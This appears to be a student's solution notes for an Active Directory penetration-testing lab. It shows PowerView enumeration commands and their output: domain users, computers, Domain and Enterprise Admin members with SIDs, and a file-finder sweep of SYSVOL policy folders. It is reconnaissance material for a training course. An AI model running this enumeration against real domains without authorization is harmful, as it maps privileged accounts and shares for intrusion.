# Solution.md

## Learning Objective No. 1: SID of the member of the Enterprise Admins group

```
Get-NetGroupMember -GroupName "Enterprise Admins" -Domain moneycorp.local -Recurse
Get-ADGroupMember -Server moneycorp.local -Identity "Enterprise Admins" -Recursive 
```

```powershell
PS C:\AD\Tools> Get-NetUser | select displayname, distinguishedname
PS C:\Users\student26>  Get-NetUser | select -ExpandProperty cn
Users
displayname	  distinguishedname
-----------   -----------------
              CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
              CN=Guest,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
              CN=DefaultAccount,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
              CN=krbtgt,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
ci admin      CN=ci admin,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
sql admin     CN=sql admin,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
web svc       CN=web svc,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
srv admin     CN=srv admin,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
app admin     CN=app admin,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
mgmt admin    CN=mgmt admin,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
svc admin     CN=svc admin,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
studentadmin  CN=studentadmin,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
sql1 admin    CN=sql1 admin,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
test da       CN=test da,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
student23     CN=student23,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
student24     CN=student24,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
student25     CN=student25,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
student26     CN=student26,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
student28     CN=student28,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
student29     CN=student29,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
student30     CN=student30,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
student31     CN=student31,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
student32     CN=student32,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
student33     CN=student33,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
student34     CN=student34,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
Control23User CN=Control23User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
Control24User CN=Control24User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
Control25User CN=Control25User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
Control26User CN=Control26User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
Control27User CN=Control27User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
Control28User CN=Control28User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
Control29User CN=Control29User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
Control30User CN=Control30User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
Control31User CN=Control31User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
Control32User CN=Control32User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
Control33User CN=Control33User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
Control34User CN=Control34User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
Support23User CN=Support23User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
Support24User CN=Support24User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
Support25User CN=Support25User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
Support26User CN=Support26User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
Support27User CN=Support27User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
Support28User CN=Support28User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
Support29User CN=Support29User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
Support30User CN=Support30User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
Support31User CN=Support31User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
Support32User CN=Support32User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
Support33User CN=Support33User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
Support34User CN=Support34User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
VPN23User     CN=VPN23User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
VPN24User     CN=VPN24User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
VPN25User     CN=VPN25User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
VPN26User     CN=VPN26User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
VPN27User     CN=VPN27User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
VPN28User     CN=VPN28User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
VPN29User     CN=VPN29User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
VPN30User     CN=VPN30User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
VPN31User     CN=VPN31User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
VPN32User     CN=VPN32User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
VPN33User     CN=VPN33User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
VPN34User     CN=VPN34User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
student27     CN=student27,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
```

```powershell
Computers
PS C:\AD\Tools> Get-NetComputer
dcorp-dc.dollarcorp.moneycorp.local
dcorp-mgmt.dollarcorp.moneycorp.local
dcorp-ci.dollarcorp.moneycorp.local
dcorp-mssql.dollarcorp.moneycorp.local
dcorp-adminsrv.dollarcorp.moneycorp.local
dcorp-appsrv.dollarcorp.moneycorp.local
dcorp-sql1.dollarcorp.moneycorp.local
dcorp-stdadm.dollarcorp.moneycorp.local
dcorp-student23.dollarcorp.moneycorp.local
dcorp-student24.dollarcorp.moneycorp.local
dcorp-student25.dollarcorp.moneycorp.local
dcorp-student26.dollarcorp.moneycorp.local
dcorp-student28.dollarcorp.moneycorp.local
dcorp-student29.dollarcorp.moneycorp.local
dcorp-student30.dollarcorp.moneycorp.local
dcorp-student31.dollarcorp.moneycorp.local
dcorp-student32.dollarcorp.moneycorp.local
dcorp-student33.dollarcorp.moneycorp.local
dcorp-student34.dollarcorp.moneycorp.local
dcorp-student27.dollarcorp.moneycorp.local
dcorp-std26.dollarcorp.moneycorp.local
```

```powershell
Domain Administrators
PS C:\AD\Tools> Get-NetGroupMember -GroupName "Domain Admins" -Recurse


GroupDomain  : dollarcorp.moneycorp.local
GroupName    : Domain Admins
MemberDomain : dollarcorp.moneycorp.local
MemberName   : svcadmin
MemberSID    : S-1-5-21-1874506631-3219952063-538504511-1122
IsGroup      : False
MemberDN     : CN=svc admin,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local

GroupDomain  : dollarcorp.moneycorp.local
GroupName    : Domain Admins
MemberDomain : dollarcorp.moneycorp.local
MemberName   : Administrator
MemberSID    : S-1-5-21-1874506631-3219952063-538504511-500
IsGroup      : False
MemberDN     : CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
```

```powershell
Enterprise Administrators
PS C:\AD\Tools> Get-NetGroupMember -GroupName "Enterprise Admins" -Domain moneycorp.local -Recurse


GroupDomain  : moneycorp.local
GroupName    : Enterprise Admins
MemberDomain : moneycorp.local
MemberName   : Administrator
MemberSID    : S-1-5-21-280534878-1496970234-700767426-500
IsGroup      : False
MemberDN     : CN=Administrator,CN=Users,DC=moneycorp,DC=local
```

```powershell
PS C:\AD\Tools> Invoke-FileFinder | Out-File -FilePath .\SensitiveFiles.txt
Find sensitive files on computers in the domain

FullName       : \\dcorp-student26.dollarcorp.moneycorp.local\shared\Download
Owner          : dcorp\student26
LastAccessTime : 6/21/2021 11:40:39 PM
LastWriteTime  : 6/21/2021 11:40:39 PM
CreationTime   : 6/21/2021 11:40:39 PM
Length         : 

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local
Owner          : BUILTIN\Administrators
LastAccessTime : 2/16/2019 11:00:05 PM
LastWriteTime  : 2/16/2019 11:00:05 PM
CreationTime   : 2/16/2019 11:00:05 PM
Length         : 

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\DfsrPrivate
Owner          : NT AUTHORITY\SYSTEM
LastAccessTime : 2/16/2019 11:07:26 PM
LastWriteTime  : 2/16/2019 11:07:26 PM
CreationTime   : 2/16/2019 11:07:26 PM
Length         : 

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies
Owner          : BUILTIN\Administrators
LastAccessTime : 2/18/2019 11:04:25 PM
LastWriteTime  : 2/18/2019 11:04:25 PM
CreationTime   : 2/16/2019 11:00:17 PM
Length         : 

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{211A25B2-03AD-4E5E-9C6A-AFEFE66EFB
                 2D}
Owner          : dcorp\Domain Admins
LastAccessTime : 2/17/2019 5:44:15 AM
LastWriteTime  : 2/17/2019 5:44:15 AM
CreationTime   : 2/17/2019 5:44:15 AM
Length         : 

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{211A25B2-03AD-4E5E-9C6A-AFEFE66EFB
                 2D}\Machine
Owner          : BUILTIN\Administrators
LastAccessTime : 2/18/2019 11:11:01 PM
LastWriteTime  : 2/18/2019 11:11:01 PM
CreationTime   : 2/17/2019 5:44:15 AM
Length         : 

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{211A25B2-03AD-4E5E-9C6A-AFEFE66EFB
                 2D}\Machine\Microsoft
Owner          : BUILTIN\Administrators
LastAccessTime : 2/17/2019 5:44:42 AM
LastWriteTime  : 2/17/2019 5:44:42 AM
CreationTime   : 2/17/2019 5:44:42 AM
Length         : 

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{211A25B2-03AD-4E5E-9C6A-AFEFE66EFB
                 2D}\Machine\Microsoft\Windows NT
Owner          : BUILTIN\Administrators
LastAccessTime : 2/17/2019 5:44:42 AM
LastWriteTime  : 2/17/2019 5:44:42 AM
CreationTime   : 2/17/2019 5:44:42 AM
Length         : 

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{211A25B2-03AD-4E5E-9C6A-AFEFE66EFB
                 2D}\Machine\Microsoft\Windows NT\SecEdit
Owner          : BUILTIN\Administrators
LastAccessTime : 4/19/2019 11:21:07 PM
LastWriteTime  : 4/19/2019 11:21:07 PM
CreationTime   : 2/17/2019 5:44:42 AM
Length         : 

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{211A25B2-03AD-4E5E-9C6A-AFEFE66EFB
                 2D}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
Owner          : BUILTIN\Administrators
LastAccessTime : 2/17/2019 5:44:42 AM
LastWriteTime  : 4/19/2019 11:21:07 PM
CreationTime   : 2/17/2019 5:44:42 AM
Length         : 1140

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{211A25B2-03AD-4E5E-9C6A-AFEFE66EFB
                 2D}\Machine\Scripts
Owner          : BUILTIN\Administrators
LastAccessTime : 2/17/2019 5:44:39 AM
LastWriteTime  : 2/17/2019 5:44:39 AM
CreationTime   : 2/17/2019 5:44:39 AM
Length         : 

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{211A25B2-03AD-4E5E-9C6A-AFEFE66EFB
                 2D}\Machine\Scripts\Shutdown
Owner          : BUILTIN\Administrators
LastAccessTime : 2/17/2019 5:44:39 AM
LastWriteTime  : 2/17/2019 5:44:39 AM
CreationTime   : 2/17/2019 5:44:39 AM
Length         : 

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{211A25B2-03AD-4E5E-9C6A-AFEFE66EFB
                 2D}\Machine\Scripts\Startup
Owner          : BUILTIN\Administrators
LastAccessTime : 2/17/2019 5:44:39 AM
LastWriteTime  : 2/17/2019 5:44:39 AM
CreationTime   : 2/17/2019 5:44:39 AM
Length         : 

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{211A25B2-03AD-4E5E-9C6A-AFEFE66EFB
                 2D}\Machine\comment.cmtx
Owner          : BUILTIN\Administrators
LastAccessTime : 2/18/2019 11:11:01 PM
LastWriteTime  : 2/18/2019 11:11:01 PM
CreationTime   : 2/18/2019 11:11:01 PM
Length         : 557

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{211A25B2-03AD-4E5E-9C6A-AFEFE66EFB
                 2D}\Machine\Registry.pol
Owner          : BUILTIN\Administrators
LastAccessTime : 2/18/2019 11:11:01 PM
LastWriteTime  : 2/18/2019 11:11:01 PM
CreationTime   : 2/18/2019 11:11:01 PM
Length         : 5876

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{211A25B2-03AD-4E5E-9C6A-AFEFE66EFB
                 2D}\User
Owner          : BUILTIN\Administrators
LastAccessTime : 2/17/2019 5:44:15 AM
LastWriteTime  : 2/17/2019 5:44:15 AM
CreationTime   : 2/17/2019 5:44:15 AM
Length         : 

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{211A25B2-03AD-4E5E-9C6A-AFEFE66EFB
                 2D}\GPT.INI
Owner          : BUILTIN\Administrators
LastAccessTime : 2/17/2019 5:44:15 AM
LastWriteTime  : 4/19/2019 11:21:07 PM
CreationTime   : 2/17/2019 5:44:15 AM
Length         : 60

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984
                 F9}
Owner          : BUILTIN\Administrators
LastAccessTime : 2/16/2019 11:00:17 PM
LastWriteTime  : 2/16/2019 11:00:17 PM
CreationTime   : 2/16/2019 11:00:17 PM
Length         : 

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984
                 F9}\MACHINE
Owner          : BUILTIN\Administrators
LastAccessTime : 2/16/2019 11:14:30 PM
LastWriteTime  : 2/16/2019 11:14:30 PM
CreationTime   : 2/16/2019 11:00:17 PM
Length         : 

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984
                 F9}\MACHINE\Microsoft
Owner          : BUILTIN\Administrators
LastAccessTime : 2/16/2019 11:00:17 PM
LastWriteTime  : 2/16/2019 11:00:17 PM
CreationTime   : 2/16/2019 11:00:17 PM
Length         : 

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984
                 F9}\MACHINE\Microsoft\Windows NT
Owner          : BUILTIN\Administrators
LastAccessTime : 2/16/2019 11:00:17 PM
LastWriteTime  : 2/16/2019 11:00:17 PM
CreationTime   : 2/16/2019 11:00:17 PM
Length         : 

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984
                 F9}\MACHINE\Microsoft\Windows NT\SecEdit
Owner          : BUILTIN\Administrators
LastAccessTime : 2/16/2019 11:00:17 PM
LastWriteTime  : 2/16/2019 11:00:17 PM
CreationTime   : 2/16/2019 11:00:17 PM
Length         : 

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984
                 F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf
Owner          : BUILTIN\Administrators
LastAccessTime : 2/16/2019 11:00:17 PM
LastWriteTime  : 2/16/2019 11:00:17 PM
CreationTime   : 2/16/2019 11:00:17 PM
Length         : 1098

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984
                 F9}\MACHINE\Registry.pol
Owner          : BUILTIN\Administrators
LastAccessTime : 2/16/2019 11:14:30 PM
LastWriteTime  : 2/16/2019 11:14:30 PM
CreationTime   : 2/16/2019 11:14:30 PM
Length         : 2786

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984
                 F9}\USER
Owner          : BUILTIN\Administrators
LastAccessTime : 2/16/2019 11:00:17 PM
LastWriteTime  : 2/16/2019 11:00:17 PM
CreationTime   : 2/16/2019 11:00:17 PM
Length         : 

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984
                 F9}\GPT.INI
Owner          : BUILTIN\Administrators
LastAccessTime : 2/16/2019 11:00:17 PM
LastWriteTime  : 2/16/2019 11:14:30 PM
CreationTime   : 2/16/2019 11:00:17 PM
Length         : 22

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{3E04167E-C2B6-4A9A-8FB7-C811158DC9
                 7C}
Owner          : dcorp\Domain Admins
LastAccessTime : 2/18/2019 11:04:25 PM
LastWriteTime  : 2/18/2019 11:04:25 PM
CreationTime   : 2/18/2019 11:04:25 PM
Length         : 

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{3E04167E-C2B6-4A9A-8FB7-C811158DC9
                 7C}\Machine
Owner          : BUILTIN\Administrators
LastAccessTime : 2/18/2019 11:09:53 PM
LastWriteTime  : 2/18/2019 11:09:53 PM
CreationTime   : 2/18/2019 11:04:25 PM
Length         : 

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{3E04167E-C2B6-4A9A-8FB7-C811158DC9
                 7C}\Machine\Microsoft
Owner          : BUILTIN\Administrators
LastAccessTime : 2/18/2019 11:05:13 PM
LastWriteTime  : 2/18/2019 11:05:13 PM
CreationTime   : 2/18/2019 11:05:13 PM
Length         : 

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{3E04167E-C2B6-4A9A-8FB7-C811158DC9
                 7C}\Machine\Microsoft\Windows NT
Owner          : BUILTIN\Administrators
LastAccessTime : 2/18/2019 11:05:13 PM
LastWriteTime  : 2/18/2019 11:05:13 PM
CreationTime   : 2/18/2019 11:05:13 PM
Length         : 

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{3E04167E-C2B6-4A9A-8FB7-C811158DC9
                 7C}\Machine\Microsoft\Windows NT\SecEdit
Owner          : BUILTIN\Administrators
LastAccessTime : 4/19/2019 11:22:16 PM
LastWriteTime  : 4/19/2019 11:22:16 PM
CreationTime   : 2/18/2019 11:05:13 PM
Length         : 

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{3E04167E-C2B6-4A9A-8FB7-C811158DC9
                 7C}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
Owner          : BUILTIN\Administrators
LastAccessTime : 2/18/2019 11:05:13 PM
LastWriteTime  : 4/19/2019 11:22:16 PM
CreationTime   : 2/18/2019 11:05:13 PM
Length         : 480

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{3E04167E-C2B6-4A9A-8FB7-C811158DC9
                 7C}\Machine\Scripts
Owner          : BUILTIN\Administrators
LastAccessTime : 2/18/2019 11:05:11 PM
LastWriteTime  : 2/18/2019 11:05:11 PM
CreationTime   : 2/18/2019 11:05:11 PM
Length         : 

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{3E04167E-C2B6-4A9A-8FB7-C811158DC9
                 7C}\Machine\Scripts\Shutdown
Owner          : BUILTIN\Administrators
LastAccessTime : 2/18/2019 11:05:11 PM
LastWriteTime  : 2/18/2019 11:05:11 PM
CreationTime   : 2/18/2019 11:05:11 PM
Length         : 

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{3E04167E-C2B6-4A9A-8FB7-C811158DC9
                 7C}\Machine\Scripts\Startup
Owner          : BUILTIN\Administrators
LastAccessTime : 2/18/2019 11:05:11 PM
LastWriteTime  : 2/18/2019 11:05:11 PM
CreationTime   : 2/18/2019 11:05:11 PM
Length         : 

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{3E04167E-C2B6-4A9A-8FB7-C811158DC9
                 7C}\Machine\comment.cmtx
Owner          : BUILTIN\Administrators
LastAccessTime : 2/18/2019 11:08:06 PM
LastWriteTime  : 2/18/2019 11:09:53 PM
CreationTime   : 2/18/2019 11:08:06 PM
Length         : 557

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{3E04167E-C2B6-4A9A-8FB7-C811158DC9
                 7C}\Machine\Registry.pol
Owner          : BUILTIN\Administrators
LastAccessTime : 2/18/2019 11:09:53 PM
LastWriteTime  : 2/18/2019 11:09:53 PM
CreationTime   : 2/18/2019 11:09:53 PM
Length         : 1240

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{3E04167E-C2B6-4A9A-8FB7-C811158DC9
                 7C}\User
Owner          : BUILTIN\Administrators
LastAccessTime : 2/18/2019 11:04:25 PM
LastWriteTime  : 2/18/2019 11:04:25 PM
CreationTime   : 2/18/2019 11:04:25 PM
Length         : 

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{3E04167E-C2B6-4A9A-8FB7-C811158DC9
                 7C}\GPT.INI
Owner          : BUILTIN\Administrators
LastAccessTime : 2/18/2019 11:04:25 PM
LastWriteTime  : 4/19/2019 11:22:16 PM
CreationTime   : 2/18/2019 11:04:25 PM
Length         : 59

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984
                 F9}
Owner          : BUILTIN\Administrators
LastAccessTime : 2/16/2019 11:00:17 PM
LastWriteTime  : 2/16/2019 11:00:17 PM
CreationTime   : 2/16/2019 11:00:17 PM
Length         : 

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984
                 F9}\MACHINE
Owner          : BUILTIN\Administrators
LastAccessTime : 2/18/2019 3:08:57 AM
LastWriteTime  : 2/18/2019 3:08:57 AM
CreationTime   : 2/16/2019 11:00:17 PM
Length         : 

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984
                 F9}\MACHINE\Microsoft
Owner          : BUILTIN\Administrators
LastAccessTime : 2/16/2019 11:00:17 PM
LastWriteTime  : 2/16/2019 11:00:17 PM
CreationTime   : 2/16/2019 11:00:17 PM
Length         : 

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984
                 F9}\MACHINE\Microsoft\Windows NT
Owner          : BUILTIN\Administrators
LastAccessTime : 2/16/2019 11:00:17 PM
LastWriteTime  : 2/16/2019 11:00:17 PM
CreationTime   : 2/16/2019 11:00:17 PM
Length         : 

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984
                 F9}\MACHINE\Microsoft\Windows NT\SecEdit
Owner          : BUILTIN\Administrators
LastAccessTime : 2/18/2019 3:09:29 AM
LastWriteTime  : 2/18/2019 3:09:29 AM
CreationTime   : 2/16/2019 11:00:17 PM
Length         : 

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984
                 F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf
Owner          : BUILTIN\Administrators
LastAccessTime : 2/16/2019 11:00:17 PM
LastWriteTime  : 2/18/2019 3:09:29 AM
CreationTime   : 2/16/2019 11:00:17 PM
Length         : 4254

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984
                 F9}\MACHINE\Scripts
Owner          : BUILTIN\Administrators
LastAccessTime : 2/18/2019 3:08:57 AM
LastWriteTime  : 2/18/2019 3:08:57 AM
CreationTime   : 2/18/2019 3:08:57 AM
Length         : 

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984
                 F9}\MACHINE\Scripts\Shutdown
Owner          : BUILTIN\Administrators
LastAccessTime : 2/18/2019 3:08:57 AM
LastWriteTime  : 2/18/2019 3:08:57 AM
CreationTime   : 2/18/2019 3:08:57 AM
Length         : 

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984
                 F9}\MACHINE\Scripts\Startup
Owner          : BUILTIN\Administrators
LastAccessTime : 2/18/2019 3:08:57 AM
LastWriteTime  : 2/18/2019 3:08:57 AM
CreationTime   : 2/18/2019 3:08:57 AM
Length         : 

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984
                 F9}\USER
Owner          : BUILTIN\Administrators
LastAccessTime : 2/16/2019 11:00:17 PM
LastWriteTime  : 2/16/2019 11:00:17 PM
CreationTime   : 2/16/2019 11:00:17 PM
Length         : 

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984
                 F9}\GPT.INI
Owner          : BUILTIN\Administrators
LastAccessTime : 2/16/2019 11:00:17 PM
LastWriteTime  : 2/18/2019 3:09:29 AM
CreationTime   : 2/16/2019 11:00:17 PM
Length         : 22

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{C4F31C31-6258-4991-AAAD-454934E882
                 AE}
Owner          : dcorp\Domain Admins
LastAccessTime : 2/18/2019 10:53:55 PM
LastWriteTime  : 2/18/2019 10:53:55 PM
CreationTime   : 2/18/2019 10:53:55 PM
Length         : 

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{C4F31C31-6258-4991-AAAD-454934E882
                 AE}\Machine
Owner          : BUILTIN\Administrators
LastAccessTime : 2/18/2019 11:09:17 PM
LastWriteTime  : 2/18/2019 11:09:17 PM
CreationTime   : 2/18/2019 10:53:55 PM
Length         : 

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{C4F31C31-6258-4991-AAAD-454934E882
                 AE}\Machine\Microsoft
Owner          : BUILTIN\Administrators
LastAccessTime : 2/18/2019 10:55:03 PM
LastWriteTime  : 2/18/2019 10:55:03 PM
CreationTime   : 2/18/2019 10:55:03 PM
Length         : 

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{C4F31C31-6258-4991-AAAD-454934E882
                 AE}\Machine\Microsoft\Windows NT
Owner          : BUILTIN\Administrators
LastAccessTime : 2/18/2019 10:55:03 PM
LastWriteTime  : 2/18/2019 10:55:03 PM
CreationTime   : 2/18/2019 10:55:03 PM
Length         : 

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{C4F31C31-6258-4991-AAAD-454934E882
                 AE}\Machine\Microsoft\Windows NT\SecEdit
Owner          : BUILTIN\Administrators
LastAccessTime : 4/19/2019 11:21:47 PM
LastWriteTime  : 4/19/2019 11:21:47 PM
CreationTime   : 2/18/2019 10:55:03 PM
Length         : 

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{C4F31C31-6258-4991-AAAD-454934E882
                 AE}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
Owner          : BUILTIN\Administrators
LastAccessTime : 2/18/2019 10:55:03 PM
LastWriteTime  : 4/19/2019 11:21:47 PM
CreationTime   : 2/18/2019 10:55:03 PM
Length         : 480

